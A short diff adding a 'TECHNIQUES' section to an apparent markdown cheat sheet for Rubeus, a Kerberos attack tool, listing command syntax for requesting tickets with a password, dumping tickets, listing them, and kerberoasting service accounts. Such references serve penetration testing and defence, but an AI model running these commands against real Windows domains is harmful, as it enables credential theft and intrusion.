@@ -87,3 +87,15 @@
 #### logonsession = Display logon session info
 
 #### currentluid = Display current user's LUID
+
+### TECHNIQUES
+
+#### 1) Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] 
+
+#### 2) Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+
+#### 3) Rubeus.exe klist [/luid:LOGINID]
+
+#### 4) Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+
+
